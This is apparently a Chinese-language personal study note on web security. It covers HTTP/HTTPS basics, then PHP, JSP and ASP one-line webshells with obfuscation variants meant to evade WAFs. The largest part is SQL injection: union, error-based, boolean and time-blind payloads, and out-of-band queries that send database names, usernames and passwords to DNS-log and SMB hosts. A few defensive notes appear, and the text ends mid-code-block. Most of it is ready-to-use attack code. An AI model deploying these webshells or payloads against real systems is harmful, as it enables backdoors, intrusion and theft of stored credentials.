## HTTP/HTTPS

### 1. HTTP协议

#### (1). 概述

##### a. 概念

* 是客户端浏览器或**其他程序与Web服务器**之间的**应用层通信协议**

##### b. 使用协议及端口

* TCP协议、80端口

##### c. 其他应用

* 可用于传输图像、声音、动画、视频等

#### (2). 工作模式

![HTTP工作模式](http://113.45.142.235:9001/laffrex/pictures/2024/10/07/202410071140620.png)

#### (3). URL

##### a. 概念

* 统一资源定位符(Uniform Resource Locator)，用来表示某一处资源的地址

##### b. 格式

![Url格式](http://113.45.142.235:9001/laffrex/pictures/2024/10/07/202410071140652.png)

* 锚点

  > 告诉浏览器，当加载某一个页面时，直接跳转到该页面某一id、class等标识元素的位置。

#### (4). 协议特点

##### a. 支持C/S模式

##### b. 简单快速

* 只需传送**请求方法和路径**
* HTTP服务器的**程序规模小**，**通信速度快**

##### c. 灵活

* 允许传输**任意类型**的数据对象，有Content-Type字段指定

##### d. 无状态

* 指协议对于事务处理**没有记忆能力**，如果后续处理需要前面信息，**必须重传**，导致了传送的**数据量增大**

#### (5). HTTP报文

##### a. 概述

* 分为请求报文(Request)与响应报文(Response)

##### b. 字段

###### ①Host

* 指示发出请求或响应的主机名

###### ②User-Agent

* 通常格式：Mozillia/5.0(平台) 引擎版本 浏览器版本号

###### ③Accept

* 分为文件类型和内容类型(MIME或媒体类型)

![http报文字段Accept](http://113.45.142.235:9001/laffrex/pictures/2024/10/07/202410071140642.png)

###### ④Accept-Language

* 客户端浏览器的语言

###### ⑤Accept-Endocding

* 客户端浏览器支持的文件压缩格式

###### ⑥Connection

* 指示是否保持连接

###### ⑦Refer&&Cookie

* 指示请求或响应来自哪里

###### c. 请求方法

![http报文方法](http://113.45.142.235:9001/laffrex/pictures/2024/10/07/202410071140640.png)

#### (6)状态码

##### a. 1xx

* 指示信息--表示请求已接收，继续处理

##### b. 2xx

* 成功--表示请求已被成功接收、理解、接受

| 状态码               | 描述                                         |
| -------------------- | -------------------------------------------- |
| 200  OK              | 请求成功，服务器已返回请求的资源             |
| 201  Created         | 请求成功，并且服务器已创建了新的资源         |
| 202  Accepted        | 请求**已接受**，但尚未处理完成               |
| 204  No Content      | 请求成功，但没有返回内容                     |
| 206  Partial Content | 服务器成功处理了部分请求（例如，在分块下载时 |



##### c. 3xx

* 重定向--要完成请求必须**进行更进一步的操作**

| 状态码                  | 描述                                      |
| ----------------------- | ----------------------------------------- |
| 301  Moved Permanently  | 请求的资源已**永久移动**到新的URL         |
| 302  Found              | 请求的资源**临时移动**到新的URL           |
| 304  Not Modified       | **资源未修改**，客户端可以使用缓存的版本  |
| 307  Temporary Redirect | **临时重定向**，请求资源暂时位于另一个URL |

##### d. 4xx

* 客户端错误--请求有**语法错误**或请求**无法实现**

| 错误码                  | 描述                               |
| ----------------------- | ---------------------------------- |
| 400  Bad Request        | 客户端请求的**语法错误**           |
| 401  Unauthorized       | 请求需要**身份验证**               |
| 403  Forbidden          | 服务器**拒绝执行**请求             |
| 404  Not Found          | 请求的**资源**在服务器上**找不到** |
| 405  Method Not Allowed | 请求方法**不被**服务器**允许**     |

##### e. 5xx

* 服务器错误

| 状态码                    | 描述                                                       |
| ------------------------- | ---------------------------------------------------------- |
| 500 Internal Server Error | 服务器内**部错误**，无法完成请求。                         |
| 501 Not Implemented       | 服务器**不支持**请求的方法。                               |
| 502 Bad Gateway           | 服务器作为网关或代理，从上游服务器收到**无效响应**         |
| 503 Service Unavailable   | 服务器**暂时不可用**，由于超载或系统维护                   |
| 504 Gateway Timeout       | 服务器作为网关或代理，**未能及时**从上游服务器**接收响应** |

##### f. 常见状态码

![常见状态码](http://113.45.142.235:9001/laffrex/pictures/2024/10/07/202410071140638.png)

### 2. HTTPS协议

#### (1)概述

##### a. SSL

* 安全套接字层(Secure Socket Layer)，位于**TCP/IP协议与各种应用层协议之间**，为数据通信提供**安全支持**

##### b. TLS

* 传输层安全(Transport Layer Security)，前身是SSL

#### (2)通信流程

1. 客户端和服务器端通过**TCP建立连接**，并发送htpps请求
2. 服务端响应，并**发送数字证书**给客户端(包括域名、公钥以及申请证书公司)
3. 客户端收到数字证书后，进行**合法性验证**
4. 验证通过后，客户端**生成**一个用于**对称加密的密钥**，并使用服务器**公钥对客户端密钥进行非对称加密**
5. 客户端将该**加密后的密钥发送**给服务端
6. 服务端收到后使用私钥进行非对称解密，得到客户端密钥后再将数据进行**对称加密生成密文并发送**
7. 客户端收到密文，并使用客户端密钥进行解密

### 3. HTTP与HTTPS区别

![HTTP与HTTPS区别](http://113.45.142.235:9001/laffrex/pictures/HTTP与HTTPS区别.png)

## WebShell

### 1. 定义

* 以php、jsp、asp、aspx或者cgi等**网页文件形式**存在的一种**命令执行环境**，也叫做**网页后门**

### 2. 常见一句话木马

### (1). php

```php
<?php eval($_POST['cmd']); ?>
```

#### (2). jsp

```jsp
<% @page language="java" Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### (3). asp

```asp
<% eval request("cmd") %>
<% excute request("cmd") %>
<% excute(request("cmd")) %>
<% excuteGlobal request("cmd") %>
```

#### (4). aspx

```asp
1. 
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
2. 
<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["pass"], "unsafe"));%>
```

### 3. 相关函数

#### (1). 代码执行

> eval()、assert()、preg_replace()、create_function()、asort()、
>
> array_map()、array_filter()、
>
> call_user_func()、call_user_func_array()

#### (2). 命令执行

> system()、exec()、shell_exec()、passthru()、popen()、反引号

### 4. 变形方法

#### (1). 关键字查找、替换

* str_replace()

  ```php
  //1. 查找
  <?php
      $a = str_replace("abc","","aabcsabcsabceabcrabct");
      @$a($_REQUEST['cmd']);
  ?>
  ```

  ![str_replace1](http://113.45.142.235:9001/laffrex/pictures/str_replace1.png)

  ```php
  //2. 替换
  <?php
      $b = "assexx";
      $c = str_replace("xx","rt",$b);
      @[""=>$c($_GET[_])];
  ?>
  ```

  ![str_replace2](http://113.45.142.235:9001/laffrex/pictures/str_replace2.png)

#### (2). 编码替换

* 编码替换

```php
<?php
    $a = base64_decode("YXNzZXJ0");
    $a($_REQUEST['cmd']);
?>
```

![base64_decode](http://113.45.142.235:9001/laffrex/pictures/base64_decode.png)

#### (3). 点操作符

```php
<?php
    $a = "as"."se";
    $b = "r"."t";
    $c = $a.$b;
    $c($_REQUEST['cmd']);
?>
```

![点字符连接](http://113.45.142.235:9001/laffrex/pictures/点字符连接.png)

#### (4). 更换操作源

###### ①隐藏assert

```php
<?php
    //？a=assert&cmd=phpinfo();
    $_REQUEST[a]($_REQUEST['cmd']);
?>
```

![更换数据源1](http://113.45.142.235:9001/laffrex/pictures/更换数据源1.png)

###### ②嵌套$_REQUEST

```php
<?php
//?b=cmd&cmd=phpinfo();
@assert($_REQUEST[$_REQUEST['b']]);
?>
```

![更换数据源2](http://113.45.142.235:9001/laffrex/pictures/更换数据源2.png)

#### (5). 替换php标签

```php
<script language="php">
    @assert($_REQUEST['cmd']);
</script>
    
<?=`$_GET["cmd"]`?>
```

![更换php标签](http://113.45.142.235:9001/laffrex/pictures/更换php标签.png)

##### 

#### (6). 字符串组合

```php
<?php
    $str = 'abcsqebrt';
    $a = $str[0].$str[3].$str[3].$str[5].$str[7].$str[8];
    @$a($_REQUEST['cmd']);
    ?>
```

![字符串截取](http://113.45.142.235:9001/laffrex/pictures/字符串截取.png)

#### (7). 自定义

###### ①自定义函数

```php
<?php
function admin($a){
    @eval($a);
}
admin($_REQUEST['admin']);
?>
```

![自定义函数](http://113.45.142.235:9001/laffrex/pictures/自定义函数.png)

###### ②自定义类

```php
<?php
class Webshell{
    function admin($a){
        @eval($a);
    }
}
$web = new Webshell();
$web->admin($_REQUEST['admin']);
?>
```

![自定义类](http://113.45.142.235:9001/laffrex/pictures/自定义类.png)

###### ③魔术方法

* __construct
* __destruct()
* __wakeup()
* __toString()
* ...

```php
//?name=phpinfo();
class Student{
    public $xw = null;
    public $xl = null;
    function __construct(){
        $this->xw = "riny(\$_ERDHRFG['anzr'])";   //对应eval($_REQUEST['name]);,需要对$进行转义
        $this->xl = str_rot13($this->xw);
        @assert($this->xl);
    }
}
new Student();
```

![魔术方法](http://113.45.142.235:9001/laffrex/pictures/魔术方法.png)

###### ④创建匿名方法

```php
<?php
$func1 = create_function('$a,$b','return ($a + $b);');
echo $func1(10,20);
?>
```

![匿名函数](http://113.45.142.235:9001/laffrex/pictures/匿名函数.png)

#### (8). 异或运算

* 通过异或运算ASCII值，来绕过WAF

## SQL注入

### 1. 定义

* 服务端**未严格校验**客户端发送的数据，而导致**服务端SQL语句被恶意修改并成功执行**的行为称为SQL注入

### 2. 产生条件

1. 客户端能**控制输入**的内容
2. 服务端**未过滤或未严格过滤**输入内容

### 3. 防御

1. 使用**预编译语句**和**参数化查询**
2. 使用存储过程
3. 使用**ORM**工具
4. 验证用户**输入**
5. 使用适当的**错误处理**机制
6. **权限**最小化

### 4. 注入点

#### 	(1). 请求方式

##### a. GET请求

* 通常显示在url中，注入点通常出现在URL的查询字符串部分

```sql
http://example.com/page?id=1' OR '1'='1
```

##### b. POST请求

* 通过HTTP请求的**主体传递**，注入点通常在请求体中，不会在URL中显示。

```html
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

#### 	(2). 注入点类型

##### a. 整数型

```sql
select name,password,uid from users where uid = $id
```

##### b. 字符型

```sql
select name,password,uid from users where uid = "$id"
```

##### c. 搜索型

```sql
select name,password,uid from users where name like "%$uname%";
```

### 5. 万能密码

#### (1). 原理

* 使用**构造方式绕过**参数的验证

#### (2). 使用

```php
admin' or 1=1 #
admin' or 1=1 --+
```

### 6. 注入流程

#### (1). 判断漏洞

```php
1. 通过注释、闭合单双引号等方法
2. 通过在参数之间使用and、or来对输入进行判断，是否有语句执行
    '1 and 1=1 -- qwe		//正常显示
    '1 and 1=2 -- qwe		//错误显示,说明有sql注入漏洞
```

#### (2). 获取数据

```php
1. 获取数据库基本信息
2. 获取数据库名
3. 获取表名
4. 获取字段名
5. 获取用户数据
```

### 7. 常用函数

#### (1). 内置函数

| 内置函数                                       | 作用                               |
| ---------------------------------------------- | ---------------------------------- |
| **database() / current_database() / schema()** | **获取当前数据库名**               |
| **version()**                                  | **获取当前数据库版本**             |
| **user() / current_user()**                    | **获取当前数据库用户**             |
| **@@secure_file_priv**                         | **获取数据库上传文件的全局变量值** |
| **@@datadir**                                  | **获取数据库的数据存储路径**       |
| **@@basedir**                                  | **获取数据库的安装路径**           |
| @@hostname                                     | 获取数据库服务器的主机名           |
| @@innodb_version                               | 获取InnoDB存储引擎的版本信息       |
| @@sql_mode                                     | 获取当前数据库的SQL模式            |
| @@version_compile_os                           | 获取数据库服务器的操作系统版本     |
| @@global.read_only                             | 检查数据库是否处于只读模式         |

#### (2). 内置表

* 创建的每个数据库连接，**默认存在information_schema**数据库，该数据库有3张常用表

##### a.schemata

| 字段          | 含义       |
| ------------- | ---------- |
| schemata_name | 指定数据库 |

##### b. tables

| 字段         | 含义       |
| ------------ | ---------- |
| table_schema | 指定数据库 |
| table_name   | 指定表     |

##### c. columns

| 字段         | 含义       |
| ------------ | ---------- |
| table_schema | 指定数据库 |
| table_name   | 指定表     |
| column_name  | 指定字段   |

#### (3). 常用函数

##### a. 字符串拼接

###### ①concat()

* 将多个字符串连接为一个字符串

* ```sql
  -1' union select 1,concat(id,email_id),3 from emails --+
  ```

  ![concat](http://113.45.142.235:9001/laffrex/pictures/concat.png)

##### ②concat_ws()

* 将多个字符串连接成为一个字符串，**可以指定**分隔符

```sql
-1' union select 1,concat_ws('__',id,email_id),3 from emails --+
```

![concat_ws](http://113.45.142.235:9001/laffrex/pictures/concat_ws.png)

##### ③group_concat()

* 将多行结果连接成一个结果返回，可以指定分隔符

```sql
-1' union select 1,group_concat(email_id),3 from emails --+
-1' union select 1,group_concat(email_id separator '~'),3 from emails --+
```

![group_concat](http://113.45.142.235:9001/laffrex/pictures/group_concat.png)

### 8. 注入类型

#### (1). 联合注入

* 使用拼接联合方式将2组或多组关键值拼凑起来进行查询

  ```sql
  查询语句1
  union
  	查询语句2
  union
  	查询语句3
  ```

##### a. 条件

1. 前后语句的查询**字段数相同**
2. 前后语句的**数据类型必须一致**
3. 页面有**回显点**

##### b. 注入流程

###### ①判断注入点

```sql
1. 先判断注入点类型
    1 and 1=1 -- 123	
    1 and 1=2 -- 123	=> 发生错误，则为整型，否则考虑为字符型
2. 判断闭合方式
    1' and 1=2 --+
    1" and 1=2 --+
    1) and 1=2 --+
    1') and 1=2 --+
    1") and 1=2 --+
    1")) and 1=2 --+
    1')) and 1=2 --+
    1")) and 1=2 --+
    1))) and 1=2 --+
    ...
```

###### ②判断字段数

* 结合**二分法**使用``order by ``判断字段数

```sql
1' order by 1 -- 123
1' order by n -- 123
1' or 1=1 order by n -- 123
```

###### ③判断回显点

```sql
1' union select 1,2 -- 123
-1' union select 1,2 -- 123		//使用-1来使union前半语句无查询返回值
```

###### ④查看数据

1. 查看数据库数、数据库名

   ```sql
   user()	//返回当前使用数据库的用户
   version()	//返回当前数据库版本
   database()	//返回当前使用的数据库名
   
   #显示所有数据库的信息并显示数据库名
   -1' union select schema_name,2 from information_schema.schemata --+ 
   -1' union select database(),2 --+
   ```

2. 查看表数、表名

   ```sql
   #获取表数
   -1' union select count(table_name),2 from information_schema.tables where table_schema = 'liuyanban' --+                '
   
   #获取所有表名
   -1' union select table_name,2 from information_schema.tables where table_schema = 'liuyanban' --+
   ```

3. 查看字段数、字段名

   ```sql
   #获取字段数
   -1' union select null,count(column_name) from information_schema.columns where table_schema='liuyanban' and table_name='liuyan' --+      '
   
   #选取指定表内所有字段名
   -1' union select table_name,column_name from information_schema.columns where table_schema='liuyanban' and table_name='liuyan' --+
   ```

4. 查看字段内数据

   ```sql
   #获取字段内容
   -1' union select 1,concat_ws("_",username,password) from admim --+
   ```

#### (2). 报错注入

##### a. 定义

* 利用数据库的**某些机制**，**人为的**制造出错误条件，使得查询结果能够出现在**报错信息中**。因此可以想办法**构造语句**，使得**错误信息中可以显示**数据库内容

##### b. 方法

###### ①XPATH

1. **extractvalue**

> extractvalue(arg1,arg2)
>
> arg1：**XML文档**，arg2：**XPATH语句**，至少接收2个参数
>
> mysql5.1及以上

* 标准payload

  ```sql
  1' and extractvalue(1,concat(0x7e,user(),0x7e)) --+
  
  //在报错信息中查询出
  1' and extractvalue(1,arg2) --+
  arg2= concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)
  ```

![报错注入信息](http://113.45.142.235:9001/laffrex/pictures/extractvalue报错注入.png)

2. **updatexml**

> updatexml(arg1,arg2,arg3)
>
> arg1为**xml文档**，arg2为**指定位置xpath的字符串**，arg3为String格式的**新值**
>
> mysql5.1.5及以上版本

* 标准payload

  ```sql
  1' and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+		'#使用0x7e是为了避免查找出的数据被替换掉
  
  1' and updatexml(1,arg2,1) --+
  arg2 = concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)
  ```

  ![updatexml报错注入](http://113.45.142.235:9001/laffrex/pictures/updatexml报错注入.png)

###### ②主键冲突floor

> mysql版本属于[5.1.5，~]
>
> 返回**向下取整的整数**，**只返回**arg1的**整数部分**
>
> mysql5.0及以上版本，<8.0
>
> [【web安全】——floor报错注入-CSDN博客](https://blog.csdn.net/qq_63844103/article/details/128569910)

* 标准payload

  ```sql
  1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) -- qwe
  
  1' and (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) -- qwe
  
  ```

  ![floor报错注入](http://113.45.142.235:9001/laffrex/pictures/floor报错注入.png)

###### ③其他报错注入

1. **列名重复name_const()**

> mysql版本属于 [5.0,5.1)
>
> **name_const(name,value)**,当用来产生一个**结果集合**时，name_const()促使该列**使用给定名称**

* 标准payload

  ```sql
  1' and (select * from (select name_const(version(),1),name_const(version(),1))a) -- qwe			'
  
  #5.7.6只支持使用version()查看版本，其他内置函数均不支持
  ```

  ![列明重复报错注入](http://113.45.142.235:9001/laffrex/pictures/列明重复报错注入.png)

2. **整形溢出exp()**

> mysql低于5.5.5，5.7.9成功，8.0失败
>
> exp是以e为底的指数函数，由于数字太大会溢出，该函数会在参数大于709时溢出，产生报错

* 标准payload

```sql
1' and exp (~(select * from(select version())a)) --+		//只有mysql5.5.29才能正常显示
```

![整形溢出报错注入](http://113.45.142.235:9001/laffrex/pictures/整形溢出报错注入.png)

3. **几何函数**

> mysql版本属于[5.5.49,~]
>
> 高版本mysql无法得到数据，目前只有**mysql5.5.29、5.1.60**能得到**正确输出**
>
> geometrycollection()、**multipoint()**、polygon()、multipolygon()、linestring()、multilinestring()

* 标准payload

  ```sql
  1' and 
      (select multipoint(
          (select * from 
              (select * from 
                  (select * from
                      (select version())a
                  )b
               )c
      	)
      )
  ) -- qwe		
  ```

![几何函数报错注入](http://113.45.142.235:9001/laffrex/pictures/几何函数报错注入.png)

###### ④json报错

* 版本属于[5.7.8,~]

1. json_type

> 获取json值的类型，当我们**传入的值不属于json格式**则报错
>
> json_type(version())

* 标准payload

  ```sql
  1' and json_type(version())%23 --+
  ```

2. json_extract

> json_extract(json_doc,path[,path])
>
> 从json_doc中读取数据，和path的参数匹配，第一个或第二个参数不是json格式就报错

```sql
1' and json_extract(user(),'$.a') -- qwe
1' and json_extract(user(),'$.a') # 

1' and json_extract('[1,2,3]',user()) -- qwe

```

3. json_array_append

> json_array_append(json_doc,path,val[,path,val]...)，
>
> 将值**附加**到json文档中**指定数组的末尾**并**返回结果，**
>
> 报错输出原理和json_extract函数相同

```sql
1' and json_array_append('[1,2,3]',user(),1) --+ 
1' and json_array_append('[1,2,3]',user(),1) -- qwe
```

##### c. 注入流程

1. 查看数据库版本

   ```sql
   1' and extractvalue(1,concat(0x7e,(select version()),0x7e)) --+
   ```

   ![1. 查看数据库版本](http://113.45.142.235:9001/laffrex/pictures/1.%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC.png)

2. 查看库名

   ```sql
   #查看库名
   1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
   ```

   ![2. 查看数据库名](http://113.45.142.235:9001/laffrex/pictures/2.%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png)

3. 查看表数、表名

   ```sql
   #查看表数
   1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+
   ```

   ![3. 查看表数](http://113.45.142.235:9001/laffrex/pictures/3.%E6%9F%A5%E7%9C%8B%E8%A1%A8%E6%95%B0.png)

   ```sql
   #查看表名
   1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+
   ```

   ![4. 查看所有表名](http://113.45.142.235:9001/laffrex/pictures/4.%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D.png)

4. 查看字段数、字段名

   ```sql
   #查看字段数
   1' and extractvalue(1,concat(0x7e,(select count(column_name) from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e)) --+
   ```

   ```sql
   #查看字段名
   1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e)) --+
   ```

   ![5. 查看表的字段名](http://113.45.142.235:9001/laffrex/pictures/5.%E6%9F%A5%E7%9C%8B%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D.png)

5. 查看字段内数据

   ```sql
   1' and extractvalue(1,concat(0x7e,(select group_concat(concat_ws('___',id,email_id)) from information_schema.columns where table_schema=database() and talbe_name='emails' limit 0,1),0x7e)) --+
   ```

#### (3). 布尔盲注

##### a. 定义

* 服务器**不会直接返回**具体的数据库，只会返回程序开发所设定的**特定信息**

##### b. 相关函数

###### ①长度截取

* substr(arg1,int1,int2)，**int1为截取开始位置(从1开始计算)**，**int2为截取长度**，其余用法完全一样

  1. substr()
  2. substring()
  3. mid()
  4. left()
  5. right()

  ```sql
  select substr(database(),1,3)
  ```

###### ②length()

* 获取数据库长度

* 使用方法：length(arg1)，arg1代表字符串(数据库名)

  ```sql
  select length(database())
  ```

###### ③ascii()

* 将单一字符，转化为ascii码值

* 使用方法：ascii(str)，str代表字符

  ```sql
  select ascii('a')
  ```

###### ④if()

* 条件判断

* 使用方式：if(exp1,true,false)

  ```sql
  select if(length(database())>0,1,0)
  ```

###### ⑤count()

* 判断记录数

##### c. 注入流程

###### ①数据库名长度

```sql
1' and (length(database()))=n --+		//n为数据库名长度
```

###### ②数据库名称

```sql
1' and (ascii(substr(database(),n,1))=m) --+		//n为第几个位置，m为ascii码[65,122]
```

###### ③表名长度

```sql
1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=m) --+
  //m为表名长度
//获取表的个数
1' and (select count(*) from information_schema.tables where table_schema=database())=m -- qwe	//m为表的个数
```

###### ④表名

```sql
1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),n,1))=m) --+			//n为表名的第几个位置，m为ascii范围[65,122]
```

###### ⑤字段长度

```sql
1' and (length((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1))=m) --+		//m为字段名长度 

//获取字段个数
1' and ((select count(*) from information_schema.columns where table_schema=database() and table_name='表名')=m) --+	//m为表的个数
```

###### ⑥字段名

```sql
1' and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1),n,1))=m) --+		//n为字段名的位置，m为ascii范围[65,122]
```

###### ⑦具体数据

```sql
select 字段 from 表
```

#### (4). 时间盲注

##### a. 相关函数

###### ①sleep()

* 用法：sleep(arg1)，arg1是休眠秒数

  ```sql
  select if(1=1,sleep(10),0)
  ```

###### ②benchmark()

* 用法：benchmark(arg1,arg2)，arg1是执行次数，arg2是执行的表达式

* 延迟时间**只和机器性能有关**

  ```sql
  select if(1=1,benchmark(5000000,md5('abc')),0)
  ```

##### b. 注入流程

###### ①获取数据库名长度

```sql
1' and if((length(database()))>5,sleep(10),0) --+
```

###### ②获取数据库名称

```sql
1' and if(ascii(substr(database(),m,1))=m,sleep(10),0) --+		//65<=m<=122
```

###### ③获取表名长度

```sql
1' and if(exp1,sleep(10),0) --+
exp1= length((select count(table_name)from information_schema.tables where table_schema=database() limit 0,1))
综上：
1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=m,sleep(10),0) --+		//m为表名长度
```

```sql
//获取表的个数
1' and if(exp1,sleep(10),0) --+
exp1= select count(*) from information_schema.tables where table_schema=database())=m
综上:
1' and if((select count(*) from information_schema.tables where table_schema=database())=4,sleep(10),0) --+	//m为表的个数
```

###### ④获取表名

```sql
1' and if(exp1,sleep(10),0) --+
exp1= ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),n,1))=m
综上：
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),n,1))=m,sleep(10),0) --+			//n为表名的第几个位置，m为ascii范围[65,122]
```

###### ⑤获取字段长度

```sql
1' and if(length(),sleep(10),0) --+
exp1= length((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1))=m
综上：
1' and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1))=2,sleep(10),0) --+		//m为字段名长度 

//获取字段个数
1' and if((select count(*) from information_schema.columns where table_schema=database() and table_name='表名')=m,sleep(10),0) --+	//m为表的个数
```

###### ⑥获取字段名

```sql
1' and if(exp1,sleep(10),0) --+
exp1= ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1),n,1))=m
综上：
1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1),n,1))=m,sleep(10),0) --+		//n为字段名的位置，m为ascii范围[65,122]
```

###### ⑦获取数据

#### (5). 数据外带

##### a. 定义

* 如果SQL注入仅能使用**时间盲注**，可以使用**OOB(out of band)**,将sql语句执行的结果以数据的形式外带出来

##### b. 满足条件

1. **Windows系统**
2. mysql的全局变量**secure_file_priv不为null**

##### c. DNSlog平台

| 网址                       | 介绍                          |
| -------------------------- | ----------------------------- |
| http://dnslog.cn/          | 仅支持DNS数据外带             |
| http://eyes.sh/            | 支持DNS和HTTP两种数据外带方式 |
| http://ceye.io/            | 支持DNS和HTTP两种数据外带方式 |
| Burpsuite Collaborator模块 | 支持DNS和HTTP两种数据外带方式 |

##### d. 外带方式

###### ①DNS数据外带

* 在极限条件(**内网机器不出网，支持dns出网，隐匿性高，不容易被拦截**)，**61长度限制，不支持敏感符号(@#$%)**，外带数据需要转码，规避流量监测设备

  1. 形式

  ```sql
  load_file(concat('\\\\',查询内容,'.网址\\abc')
  or
  load_file(concat('//',查询内容,'.网址/abc')	# /abc指定外部路径    
  ```

  2. 实例

     ```sql
     #1.获取数据库名
     select * from users where id=1 and load_file(concat('\\\\',(select database()),'.Laffrex.eyes.sh/abc'));
     
     #2.获取表名
     select * from users where id=1 and load_file(concat('\\\\',(select group_concat(table_name separator '_') from information_schema.tables where table_schema=database()),'.Laffrex.eyes.sh/abc'));
     
     #3.获取字段名
     select * from users where id=1 and load_file(concat('//',(select group_concat(column_name separator '_') from information_schema.columns where table_schema=database() and table_name='users'),'.Laffrex.eyes.sh/abc'));
     
     #4.获取字段数据
     select * from users where id>0 and load_file(concat('//',(select group_concat(concat_ws('_',id,username,password) separator '__') from information_schema.columns where table_schema=database() and table_name='users'),'.Laffrex.eyes.sh/abc'));
     ```

###### ②SMB数据外带

* **默认支持TCP/UDP出网方式时可用**，**无长度限制和符号限制**，规避流量监测设备

* Centos7上安装SMB服务

  ```php
  1. 安装smb服务
  	yum install samba -y
  2. 修改配置文件
  	vim /etc/samba/smb.conf
  3. 修改samba日志路径
  	vim /var/log/samba/log.smbd
  4. 利用实时查看日志并匹配结果
  	tail -f /var/log/samba/log.smbd | grep "failed to find service"
  ```

* payload

  ```sql
  1' and load_file(concat('\\\\192.168.172.130\\',(select user()),'t'))%23
  
  1' and load_file(concat('\\\\192.168.172.130\\',(select group_concat(schema_name) from information_schema.schemata),'t'))%23
  ```

###### ③HTTP数据外带

##### e. 注入流程

###### ①获取数据库名

```sql
1' and load_file(concat('\\\\',(select database()),'.Laffrex.eyes.sh\\abc')) --+
```

###### ②获取表名

```sql
1' and load_file(concat('\\\\',(select group_concat(table_name separator '_') from information_schema.tables where table_schema=database()),'.Laffrex.eyes.sh\\abc')) --+
```

###### ③获取字段名

```sql
1' and load_file(concat('//',(select group_concat(column_name separator '_') from information_schema.columns where table_schema=database() and table_name='users'),'.Laffrex.eyes.sh/abc')) --+
```

###### ④获取字段数据

* DNS数据外带有字符大小限制

```sql
#获取id
1' AND load_file(CONCAT('\\\\',(SELECT group_concat(id separator '__') FROM users),'.Laffrex.eyes.sh/abc')) --+					'
#获取username
1' AND load_file(CONCAT('\\\\',(SELECT SUBSTRING(group_concat(username separator '__'), 1, 60) FROM 
users),'.Laffrex.eyes.sh/abc1')) --+		'#本次字符最大长度为63

1' AND load_file(CONCAT('\\\\',(SELECT SUBSTRING(group_concat(username separator '__'), 61, 120) FROM users),'.Laffrex.eyes.sh/abc1')) --+				

1' AND load_file(CONCAT('\\\\',(SELECT substring(group_concat(concat_ws('_',id,username,password) separator '__'),1,45) FROM users),'.Laffrex.eyes.sh/abc')) --+	//本次字符最大长度45
```

#### (6). 其他类型

##### a. 宽字节注入

###### ①产生原因

> set **character_set_client**="gbk"，通常导致**编码转换的注入问题**
>
> mysql在使用**GBK编码**时，**符合条件**会认为**2个字符是1个汉字**
>
> 第一个字节**129-254**，第二个字节为**64-254**

###### ②原理

> ①程序员对**特殊字符**(例如单引号)进行**正则匹配通过反斜杠\使其失效**，无法使用普通注入；
>
> ②gbk编码，可以使用ascii＞128的字符与**反斜杠\组合成新字符**，从而**绕过**反斜杠**转义**

###### ③绕过方法

1. 黑盒

   * 在注入点**后键入%df**，再开始正常注入

   ```sql
   1%df%' order by 3 -- qwe
   ```

2. 白盒

   * 查看Mysql编码是否为**GBK**
   * 是否使用了**preg_replace()**进行正则替换
   * 是否使用了**addslashes()**进行转义
   * 是否使用了**mysql_real_escape_string()**进行转义

###### ④修复建议

1. 设置编码

   ```sql
   Mysql_query("SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary",$conn);
   ```

2. 使用过滤函数

   ```php
   mysql_real_escape_string()/addslashes()
   ```

##### b. HTTP头注入

###### ①污染参数

![HTTP头参数](http://113.45.142.235:9001/laffrex/pictures/HTTP头参数.png)

###### ②产生原因

1. 在网页代码中的**ip字段**与**数据库**有交互
2. 代码中使用了**超全局变量$_SERVER[]**

###### ③修复建议

1. 过滤回车换行字符(%0d%0a、%0D%0A)
2. 不采用有漏洞版本的apache服务器
3. 对参数做**合法性校验**以及**长度限制**，**谨慎地**根据用户传入的参数设置**http返回包的header设置**

##### c. 二次编码注入

###### ①原理

* 使用过滤函数**addslashes()**时，特殊符号前的**反斜杠**转义字符会被**urldecode()等函数再一次解码**，去掉转义字符，导致转移失败

  | 用户输入  | php解析 | addslashes()编码 | urldecode()解析 | 最终输入 | 结果       |
  | --------- | ------- | ---------------- | --------------- | -------- | ---------- |
  | id=1%27   | id=1'   | id=1`\'`         | （没有该函数）  | id=1`\'` | 无法注入！ |
  | id=1%2527 | id=1%27 | id=1%27          | （没有该函数）  | id=1%27  | 无法注入！ |
  | id=1%2527 | id=1%27 | id=1%27          | id=1'           | id=1'    | 注入成功！ |

```sql
